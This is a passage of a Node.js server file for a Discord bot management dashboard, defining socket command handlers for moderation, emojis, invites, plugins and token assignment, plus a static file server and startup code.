      name: targetName,
      type: targetType,
      allowed,
      denied
    });
  }
  socket.emit('category_permissions', { category_id: String(cat.id), overwrites });
});

registerCommand('category_permissions_set')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  if (!guildId) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const catId = params.category_id;
  const cat = guild.channels.cache.get(catId);
  if (!cat || cat.type !== ChannelType.GuildCategory) return;
  const targetId = params.target_id;
  const targetType = params.target_type || 'role';
  const permission = params.permission;
  const action = params.action;
  let target;
  if (targetType === 'role') target = guild.roles.cache.get(targetId);
  else target = guild.members.cache.get(targetId);
  if (!target) return;
  const flag = permissionNameToFlag(permission);
  if (!flag) return;
  let overwrite = cat.permissionOverwrites.cache.get(targetId);
  if (!overwrite) {
    overwrite = { allow: new Permissions(), deny: new Permissions() };
  } else {
    overwrite = { allow: overwrite.allow.clone(), deny: overwrite.deny.clone() };
  }
  if (action === 'allow') overwrite.allow.add(flag);
  else if (action === 'deny') overwrite.deny.add(flag);
  else if (action === 'neutral') {
    overwrite.allow.remove(flag);
    overwrite.deny.remove(flag);
  }
  try {
    await cat.permissionOverwrites.create(target, { allow: overwrite.allow, deny: overwrite.deny });
  } catch (e) {
    logger.error(`Category permissions set error: ${e.message}`);
  }
});

registerCommand('category_edit')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  if (!guildId) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const catId = params.category_id;
  const cat = guild.channels.cache.get(catId);
  if (!cat || cat.type !== ChannelType.GuildCategory) return;
  const updateData = {};
  if ('name' in params) updateData.name = params.name;
  if ('position' in params) updateData.position = parseInt(params.position);
  if (Object.keys(updateData).length > 0) {
    try {
      await cat.edit(updateData);
      socket.emit('notification', `Category ${cat.name} updated`);
    } catch (e) {
      logger.error(`Edit category error: ${e.message}`);
    }
  }
});

registerCommand('server_bans_list')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const bans = [];
  try {
    const banList = await guild.bans.fetch();
    for (const ban of banList.values()) {
      bans.push({
        user_id: String(ban.user.id),
        user_name: ban.user.tag,
        reason: ban.reason,
        avatar_url: getAvatarUrl(ban.user)
      });
    }
  } catch (e) {
    logger.error(`Bans list error: ${e.message}`);
  }
  socket.emit('server_bans', { bans });
});

registerCommand('member_unban')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  const userId = params.user_id;
  if (!validateId(guildId) || !validateId(userId)) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  try {
    await guild.bans.remove(userId);
    socket.emit('notification', 'User unbanned');
  } catch (e) {
    logger.error(`Unban error: ${e.message}`);
  }
});

registerCommand('guild_leave')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  if (!guildId) return;
  const guild = bot.guilds.cache.get(guildId);
  if (guild) {
    try {
      await guild.leave();
      socket.emit('notification', `Left guild ${guild.name}`);
    } catch (e) {
      logger.error(`Leave guild error: ${e.message}`);
    }
  }
});

registerCommand('server_audit_log')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const limit = Math.min(params.limit || 50, 100);
  const entries = [];
  try {
    const auditLogs = await guild.fetchAuditLogs({ limit });
    for (const entry of auditLogs.entries.values()) {
      entries.push({
        action: actionTypeToName(entry.actionType),
        user: entry.executor ? entry.executor.tag : 'Unknown',
        target: entry.target ? entry.target.toString() : 'Unknown',
        reason: entry.reason,
        created_at: entry.createdAt.toISOString().slice(0,19).replace('T',' ')
      });
    }
  } catch (e) {
    logger.error(`Audit log error: ${e.message}`);
  }
  socket.emit('server_audit_log', { entries });
});

registerCommand('emoji_upload')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  const name = params.name || 'emoji';
  const imageB64 = params.image;
  if (!guildId || !imageB64) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  try {
    const imgBytes = Buffer.from(imageB64, 'base64');
    const emoji = await guild.emojis.create({ attachment: imgBytes, name });
    socket.emit('notification', `Emoji ${emoji.name} created`);
  } catch (e) {
    logger.error(`Upload emoji error: ${e.message}`);
    socket.emit('error', { message: 'Failed to upload emoji' });
  }
});

registerCommand('emoji_delete')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  const emojiId = params.emoji_id;
  if (!guildId || !emojiId) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const emoji = guild.emojis.cache.get(emojiId);
  if (emoji) {
    try {
      await emoji.delete();
      socket.emit('notification', 'Emoji deleted');
    } catch (e) {
      logger.error(`Delete emoji error: ${e.message}`);
    }
  }
});

registerCommand('sticker_upload')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  const name = params.name || 'sticker';
  const description = params.description || '';
  const emoji = params.emoji || '😀';
  const imageB64 = params.image;
  if (!guildId || !imageB64) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  try {
    const imgBytes = Buffer.from(imageB64, 'base64');
    const sticker = await guild.stickers.create({ file: { attachment: imgBytes, name: 'sticker.png' }, name, tags: emoji, description });
    socket.emit('notification', `Sticker ${sticker.name} created`);
  } catch (e) {
    logger.error(`Upload sticker error: ${e.message}`);
    socket.emit('error', { message: 'Failed to upload sticker' });
  }
});

registerCommand('sticker_delete')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  const stickerId = params.sticker_id;
  if (!guildId || !stickerId) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const sticker = guild.stickers.cache.get(stickerId);
  if (sticker) {
    try {
      await sticker.delete();
      socket.emit('notification', 'Sticker deleted');
    } catch (e) {
      logger.error(`Delete sticker error: ${e.message}`);
    }
  }
});

registerCommand('server_invites_list')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const invites = [];
  try {
    const inviteCollection = await guild.invites.fetch();
    for (const inv of inviteCollection.values()) {
      invites.push({
        code: inv.code,
        url: inv.url,
        channel: inv.channel ? inv.channel.name : 'Unknown',
        inviter: inv.inviter ? inv.inviter.tag : 'Unknown',
        uses: inv.uses,
        max_uses: inv.maxUses,
        max_age: inv.maxAge,
        temporary: inv.temporary,
        created_at: inv.createdAt ? inv.createdAt.toISOString().slice(0,19).replace('T',' ') : ''
      });
    }
  } catch (e) {
    logger.error(`Get guild invites error: ${e.message}`);
  }
  socket.emit('server_invites', { invites });
});

registerCommand('invite_create')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  const channelId = params.channel_id;
  const maxUses = parseInt(params.max_uses) || 0;
  const maxAge = parseInt(params.max_age) || 0;
  const temporary = params.temporary || false;
  if (!guildId || !channelId) return;
  const guild = bot.guilds.cache.get(guildId);
  const channel = guild?.channels.cache.get(channelId);
  if (!channel) return;
  try {
    const inv = await channel.createInvite({ maxUses, maxAge, temporary });
    socket.emit('notification', `Invite created: ${inv.url}`);
  } catch (e) {
    logger.error(`Create invite error: ${e.message}`);
  }
});

registerCommand('invite_revoke')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const code = params.code;
  if (!code) return;
  try {
    const invite = await bot.fetchInvite(code);
    await invite.delete();
    socket.emit('notification', 'Invite revoked');
  } catch (e) {
    logger.error(`Revoke invite error: ${e.message}`);
  }
});

registerCommand('member_kick')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const userId = params.user_id;
  if (!validateId(userId)) return;
  const member = guild.members.cache.get(userId);
  if (!member) return;
  try {
    await member.kick();
    socket.emit('notification', `${member.displayName} kicked`);
  } catch (e) {
    logger.error(`Kick error: ${e.message}`);
  }
});

registerCommand('server_expression_list')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const emojis = guild.emojis.cache.filter(e => e.available).map(emoji => ({
    id: String(emoji.id), name: emoji.name, url: emoji.url
  }));
  socket.emit('server_expression_data', { emojis });
});

registerCommand('member_ban')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const userId = params.user_id;
  const reason = params.reason || '';
  if (!validateId(userId)) return;
  const member = guild.members.cache.get(userId);
  if (!member) return;
  try {
    await member.ban({ reason });
    socket.emit('notification', `${member.displayName} banned`);
  } catch (e) {
    logger.error(`Ban error: ${e.message}`);
  }
});

registerCommand('get_meme_config')(async (params, { socket }) => {
  const memeConfigPath = path.join(getBotDataDir(), 'meme_config.json');
  let cfg = { enabled: true, prefix: '$' };
  if (fs.existsSync(memeConfigPath)) {
    try {
      cfg = JSON.parse(fs.readFileSync(memeConfigPath, 'utf8'));
    } catch {}
  }
  socket.emit('meme_config', cfg);
});

registerCommand('toggle_background_task')(async (params, { socket }) => {
  const key = params.key;
  const enabled = params.enabled !== undefined ? params.enabled : true;
  if (key === 'memes') {
    const memeConfigPath = path.join(getBotDataDir(), 'meme_config.json');
    let cfg = { enabled, prefix: '$' };
    if (fs.existsSync(memeConfigPath)) {
      try {
        const existing = JSON.parse(fs.readFileSync(memeConfigPath, 'utf8'));
        cfg.prefix = existing.prefix || '$';
      } catch {}
    }
    fs.writeFileSync(memeConfigPath + '.tmp', JSON.stringify(cfg));
    fs.renameSync(memeConfigPath + '.tmp', memeConfigPath);
    socket.emit('notification', `Meme Generator ${enabled ? 'enabled' : 'disabled'}`);
  } else {
    socket.emit('notification', `Unknown task: ${key}`);
  }
});

registerCommand('set_bg_prefix')(async (params, { socket }) => {
  const key = params.key;
  const prefix = params.prefix || '$';
  if (key === 'memes') {
    const memeConfigPath = path.join(getBotDataDir(), 'meme_config.json');
    let cfg = { enabled: true, prefix };
    if (fs.existsSync(memeConfigPath)) {
      try {
        const existing = JSON.parse(fs.readFileSync(memeConfigPath, 'utf8'));
        cfg.enabled = existing.enabled !== undefined ? existing.enabled : true;
      } catch {}
    }
    fs.writeFileSync(memeConfigPath + '.tmp', JSON.stringify(cfg));
    fs.renameSync(memeConfigPath + '.tmp', memeConfigPath);
    socket.emit('notification', `Meme prefix set to ${prefix}`);
  } else {
    socket.emit('notification', `Unknown task: ${key}`);
  }
});

registerCommand('plugin_list_installed')(async (params, { socket }) => {
  const pluginsLoader = require('./plugins/loader');
  const pluginsData = [];
  for (const p of Object.values(pluginsLoader.PLUGIN_REGISTRY)) {
    if (p.loaded) {
      pluginsData.push({
        key: p.sidebar?.key || '',
        name: p.name || '',
        icon: p.sidebar?.icon || '⚡',
        version: p.version || '',
        author: p.author || '',
        description: p.description || ''
      });
    }
  }
  socket.emit('plugin_installed_list', pluginsData);
});

registerCommand('save_global_theme')(async (params, { socket }) => {
  const themePath = params.path || '';
  const themeDir = path.join(SYS_DIR, 'config');
  fs.mkdirSync(themeDir, { recursive: true });
  fs.writeFileSync(path.join(themeDir, 'theme.json'), JSON.stringify({ theme_path: themePath }));
  socket.emit('notification', 'Global theme saved');
});

registerCommand('fetch_arkv_markup')(async (params, { socket }) => {
  const arkvPath = path.join(SYS_DIR, 'arkv.md');
  let content = '';
  if (fs.existsSync(arkvPath)) {
    try {
      content = fs.readFileSync(arkvPath, 'utf8');
    } catch {
      content = '# App Info\n\n*No content available.*';
    }
  } else {
    content = '# App Info\n\n*No content available. Create `.arklum_sys/arkv.md` to populate this page.*';
  }
  socket.emit('arkv_content', { content });
});

registerCommand('plugin_get_page')(async (params, { socket }) => {
  const key = params.key;
  const pluginsLoader = require('./plugins/loader');
  const p = pluginsLoader.PLUGIN_REGISTRY[key];
  if (p && p.loaded && p.sidebar?.key === key) {
    let content = null;
    if (typeof p.content_provider === 'function') {
      const result = p.content_provider();
      if (result instanceof Promise) content = await result;
      else content = result;
    } else if (p.path && fs.existsSync(path.join(p.path, 'dashboard.html'))) {
      content = fs.readFileSync(path.join(p.path, 'dashboard.html'), 'utf8');
    }
    if (content) {
      socket.emit('plugin_page_content', { key, html: content });
    } else {
      socket.emit('error', { message: 'Plugin has no content' });
    }
  } else {
    socket.emit('error', { message: 'Plugin page not found' });
  }
});

registerCommand('reset_system')(async (params, { socket }) => {
  const configDir = path.join(SYS_DIR, 'config');
  if (fs.existsSync(configDir)) {
    fs.rmSync(configDir, { recursive: true, force: true });
  }
  fs.mkdirSync(configDir, { recursive: true });
  tokenVault = [];
  currentBotTokenIndex = -1;
  saveEncryptedTokens(tokenVault);
  saveConfig({ ...DEFAULT_CONFIG });
  socket.emit('system_reset_complete', {});
});

registerCommand('plugin_get_settings_registry')(async (params, { socket }) => {
  const pluginsLoader = require('./plugins/loader');
  const { tabs, sections } = pluginsLoader.get_all_settings_registry();
  socket.emit('plugin_settings_registry', { tabs, sections });
});

registerCommand('plugin_uninstall')(async (params, { socket }) => {
  const key = params.key;
  if (!key) {
    socket.emit('error', { message: 'No plugin key provided' });
    return;
  }
  const pluginsLoader = require('./plugins/loader');
  pluginsLoader.teardown_plugin(key);
  const pluginInfo = pluginsLoader.PLUGIN_REGISTRY[key];
  if (pluginInfo && pluginInfo.path && fs.existsSync(pluginInfo.path)) {
    fs.rmSync(pluginInfo.path, { recursive: true, force: true });
  }
  delete pluginsLoader.PLUGIN_REGISTRY[key];
  const data = pluginsLoader.load_assignments();
  let changed = false;
  const globalList = data.__global__ || [];
  if (globalList.includes(key)) {
    data.__global__ = globalList.filter(k => k !== key);
    changed = true;
  }
  for (const tokenKey of Object.keys(data)) {
    if (tokenKey === '__global__') continue;
    if (Array.isArray(data[tokenKey]) && data[tokenKey].includes(key)) {
      data[tokenKey] = data[tokenKey].filter(k => k !== key);
      if (data[tokenKey].length === 0) delete data[tokenKey];
      changed = true;
    }
  }
  if (changed) pluginsLoader.save_assignments(data);
  const pluginDataDir = path.join(SYS_DIR, 'config', 'plugins', key);
  if (fs.existsSync(pluginDataDir)) {
    fs.rmSync(pluginDataDir, { recursive: true, force: true });
  }
  socket.emit('notification', `Plugin ${key} fully uninstalled`);
  socket.emit('plugin_sidebar_update', getSidebarPluginList());
});

function getSidebarPluginList() {
  const pluginsLoader = require('./plugins/loader');
  const items = [];
  for (const p of Object.values(pluginsLoader.PLUGIN_REGISTRY)) {
    if (p.loaded) {
      items.push({
        key: p.sidebar?.key || '',
        icon: p.sidebar?.icon || '⚡',
        title: p.sidebar?.title || ''
      });
    }
  }
  return items;
}

registerCommand('plugin_get_ui_slot')(async (params, { socket }) => {
  const slotId = params.slot_id;
  const context = params.context || {};
  if (!slotId) return;
  const pluginsLoader = require('./plugins/loader');
  const html = pluginsLoader.resolve_ui_slot(slotId, context);
  if (html !== null) {
    socket.emit('plugin_ui_slot_response', { slot_id: slotId, html });
  }
});

registerCommand('plugin_get_token_list')(async (params, { socket }) => {
  const pluginsLoader = require('./plugins/loader');
  const data = pluginsLoader.load_assignments();
  const globalList = data.__global__ || [];
  const tokensInfo = tokenVault.map((t, i) => {
    const assigned = data[String(i)] || [];
    const total = new Set([...globalList, ...assigned]).size;
    return {
      index: i,
      name: t.name || `Token ${i+1}`,
      plugin_count: total
    };
  });
  socket.emit('plugin_token_list', { tokens: tokensInfo, global_plugins: globalList });
});

registerCommand('plugin_get_token_plugins')(async (params, { socket }) => {
  const tokenIndex = params.token_index ?? -1;
  const pluginsLoader = require('./plugins/loader');
  const data = pluginsLoader.load_assignments();
  const globalList = data.__global__ || [];
  const tokenList = tokenIndex >= 0 ? (data[String(tokenIndex)] || []) : [];
  const pluginsInfo = [];
  for (const [key, info] of Object.entries(pluginsLoader.PLUGIN_REGISTRY)) {
    const isGlobal = globalList.includes(key);
    const isToken = tokenList.includes(key);
    if (isGlobal || isToken) {
      pluginsInfo.push({
        key,
        name: info.name || key,
        version: info.version || '0.0.0',
        description: info.description || '',
        global: isGlobal,
        loaded: info.loaded || false
      });
    }
  }
  socket.emit('plugin_token_plugins', { token_index: tokenIndex, plugins: pluginsInfo });
});

registerCommand('plugin_assign')(async (params, { socket }) => {
  const tokenIndex = params.token_index;
  const pluginKey = params.plugin_key;
  if (tokenIndex === undefined || !pluginKey) return;
  const pluginsLoader = require('./plugins/loader');
  const data = pluginsLoader.load_assignments();
  if (!data[String(tokenIndex)]) data[String(tokenIndex)] = [];
  if (!data[String(tokenIndex)].includes(pluginKey)) data[String(tokenIndex)].push(pluginKey);
  pluginsLoader.save_assignments(data);
  socket.emit('notification', `Plugin ${pluginKey} assigned to token ${tokenIndex}`);
});

registerCommand('plugin_unassign')(async (params, { socket }) => {
  const tokenIndex = params.token_index;
  const pluginKey = params.plugin_key;
  if (tokenIndex === undefined || !pluginKey) return;
  const pluginsLoader = require('./plugins/loader');
  const data = pluginsLoader.load_assignments();
  if (data[String(tokenIndex)] && data[String(tokenIndex)].includes(pluginKey)) {
    data[String(tokenIndex)] = data[String(tokenIndex)].filter(k => k !== pluginKey);
    if (data[String(tokenIndex)].length === 0) delete data[String(tokenIndex)];
  }
  pluginsLoader.save_assignments(data);
  socket.emit('notification', `Plugin ${pluginKey} removed from token ${tokenIndex}`);
});

registerCommand('plugin_set_global')(async (params, { socket }) => {
  const pluginKey = params.plugin_key;
  const globalState = params.global !== undefined ? params.global : true;
  if (!pluginKey) return;
  const pluginsLoader = require('./plugins/loader');
  const data = pluginsLoader.load_assignments();
  if (!data.__global__) data.__global__ = [];
  if (globalState) {
    if (!data.__global__.includes(pluginKey)) data.__global__.push(pluginKey);
    for (const k of Object.keys(data)) {
      if (k !== '__global__' && Array.isArray(data[k]) && data[k].includes(pluginKey)) {
        data[k] = data[k].filter(p => p !== pluginKey);
        if (data[k].length === 0) delete data[k];
      }
    }
  } else {
    data.__global__ = data.__global__.filter(p => p !== pluginKey);
    if (data.__global__.length === 0) delete data.__global__;
  }
  pluginsLoader.save_assignments(data);
  socket.emit('notification', `Plugin ${pluginKey} is now ${globalState ? 'global' : 'not global'}`);
});

const MIME_TYPES = {
  '.html': 'text/html',
  '.js': 'application/javascript',
  '.css': 'text/css',
  '.png': 'image/png',
  '.gif': 'image/gif',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.json': 'application/json',
  '.ico': 'image/x-icon'
};

async function serveStaticFile(filePath, res) {
  try {
    const data = await fs.promises.readFile(filePath);
    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  } catch {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
}

function openDefaultBrowser(url) {
  if (process.env.ARK_NO_BROWSER) return;
  const { spawn } = require('child_process');
  const tryCmd = (bin, args) => new Promise(res => {
    const p = spawn(bin, args, { stdio: 'ignore' });
    p.on('error', () => res(false));
    p.on('spawn', () => { p.unref(); res(true); });
  });
  const candidates = process.platform === 'win32'
    ? [['cmd', ['/c', 'start', '', url]]]
    : process.platform === 'darwin' ? [['open', [url]]]
    : [['termux-open-url', [url]], ['am', ['start', '-a', 'android.intent.action.VIEW', '-d', url]], ['xdg-open', [url]]];
  (async () => {
    for (const [b, a] of candidates) { if (await tryCmd(b, a)) break; }
  })();
}

async function handleRequest(req, res) {
  if (req.url.startsWith('/socket.io/')) return;
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = url.pathname;

  if (pathname === '/') {
    try {
      let html = fs.readFileSync('static/arklum.html', 'utf8');
      try {
        const pluginsLoader = require('./plugins/loader');
        const { cssList, jsList } = pluginsLoader.get_all_injections();
        const parts = [];
        if (cssList.length) parts.push(`<style>${cssList.join('\n')}</style>`);
        if (jsList.length) parts.push(`<script>${jsList.join('\n')}</script>`);
        const presetScript = parts.join('\n');
        html = html.replace('<!-- PRESET_SCRIPT -->', presetScript || '');
        html = html.replace('</head>', '<style id="ns-nav-safe">:root{--dock-h:76px}#main-content{padding-bottom:calc(var(--dock-h) + env(safe-area-inset-bottom))!important;box-sizing:border-box;scroll-padding-bottom:calc(var(--dock-h) + env(safe-area-inset-bottom))}@media(min-width:901px){#main-content{padding-bottom:24px!important}}</style></head>');
      } catch {}
      const forge = getForgeChunk();
      if (forge) html = html.replace('</body>', forge + '\n</body>');
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(html);
    } catch {
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end('<html><body>Error loading dashboard</body></html>');
    }
    return;
  }

  if (pathname === '/management.js') return serveStaticFile('static/management.js', res);
  if (pathname === '/botprofile.js') return serveStaticFile('static/botprofile.js', res);
  if (pathname === '/navshell.js') return serveStaticFile('static/navshell.js', res);
  if (pathname === '/management/devportal.js') return serveStaticFile('static/management/devportal.js', res);
  if (pathname === '/management/utility.js') return serveStaticFile('static/management/utility.js', res);
  if (pathname === '/management/status.js') return serveStaticFile('static/management/status.js', res);
  if (pathname === '/management/chat.js') return serveStaticFile('static/management/chat.js', res);
  if (pathname === '/management/settings.js') return serveStaticFile('static/management/settings.js', res);

  if (pathname === '/themes/') {
    try {
      const themesDir = path.join('static', 'themes');
      const files = fs.readdirSync(themesDir).filter(f => f.endsWith('.json')).map(f => ({
        name: f.replace('.json','').replace(/-/g,' ').replace(/\b\w/g, c => c.toUpperCase()),
        path: `themes/${f}`
      }));
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(files));
    } catch {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('[]');
    }
    return;
  }

  if (pathname === '/global-theme') {
    const themeFile = path.join(SYS_DIR, 'config', 'theme.json');
    if (fs.existsSync(themeFile)) {
      try {
        const data = JSON.parse(fs.readFileSync(themeFile, 'utf8'));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(data));
        return;
      } catch {}
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ theme_path: 'themes/default.json' }));
    return;
  }

  if (pathname.startsWith('/themes/')) {
    const file = pathname.substring('/themes/'.length);
    if (file.includes('..')) {
      res.writeHead(404);
      res.end();
      return;
    }
    const filePath = path.join('static', 'themes', file);
    const normalized = path.normalize(filePath);
    if (!normalized.startsWith(path.normalize('static/themes'))) {
      res.writeHead(404);
      res.end();
      return;
    }
    return serveStaticFile(normalized, res);
  }

  if (pathname.startsWith('/plugins/')) {
    const parts = pathname.split('/').filter(Boolean);
    if (parts.length >= 2) {
      const pluginName = parts[1];
      const filePath = path.join('plugins', pluginName, parts.slice(2).join('/'));
      if (filePath.includes('..')) {
        res.writeHead(404);
        res.end();
        return;
      }
      return serveStaticFile(filePath, res);
    }
    res.writeHead(404);
    res.end();
    return;
  }

  if (pathname.startsWith('/sys-icons/')) {
    const filename = pathname.substring('/sys-icons/'.length);
    if (/^[a-zA-Z0-9_\-\.]+\.(png|jpg|jpeg|gif|webp|svg)$/.test(filename)) {
      const iconPath = path.join(SYS_DIR, 'icons', filename);
      if (fs.existsSync(iconPath)) {
        return serveStaticFile(iconPath, res);
      }
    }
    res.writeHead(404);
    res.end();
    return;
  }

  if (pathname === '/arklum.gif' || pathname === '/arklum.png') {
  return serveStaticFile('arklum.png', res);
  }
  if (pathname === '/app-version') {
    let version = '';
    try {
      const firstLine = fs.readFileSync(path.join(SYS_DIR, 'arkv.md'), 'utf8').split('\n')[0].trim();
      const m = firstLine.match(/v?\d+(\.\d+)*/);
      version = m ? m[0] : firstLine;
    } catch {}
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ version }));
    return;
}
  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('Not Found');
}


async function main() {
  require('./modules/chat');
  require('./modules/devportal');
  require('./modules/status');
  require('./modules/utility');
  require('./modules/memes');
  require('./modules/updater');
  require('./plugins/api');
  require('./plugins/marketplace');

  const host = process.env.HOST || '0.0.0.0';
  const port = parseInt(process.env.PORT) || 8000;
  httpServer.on('request', handleRequest);
  httpServer.listen(port, host, () => {
    console.log(`[ARKLUM] server running at http://${host}:${port}`);
  });
}

module.exports = {
  io,
  getBot,
  registerCommand,
  commandHandlers,
  checkRateLimit,
  validateId,
  validateMessageContent,
  renderMessage,
  getAvatarUrl,
  getUserBannerUrl,
  embedToDict,
  classifyAttachment,
  logger,
  getBotDataDir,
  config,
  tokenVault,
  getCurrentBotTokenIndex: () => currentBotTokenIndex,
  setCurrentBotTokenIndex: (idx) => { currentBotTokenIndex = idx; },
  saveEncryptedTokens,
  loadEncryptedTokens,
  executeWebCommand,
  loadDashboardPrefs,
  saveDashboardPrefs,
  getGuildListWithBanners,
  fetchClientId,
  fetchBotApplicationInfo,
  loadConfig,
  saveConfig,
  VALID_ID_REGEX,
  SYS_DIR,
  KEY_FILE,
  TOKENS_ENC,
  PAYLOAD_ENC,
  CONFIG_FILE,
  DEFAULT_CONFIG
};

main().catch(err => {
  console.error('Failed to start:', err);
  process.exit(1);
});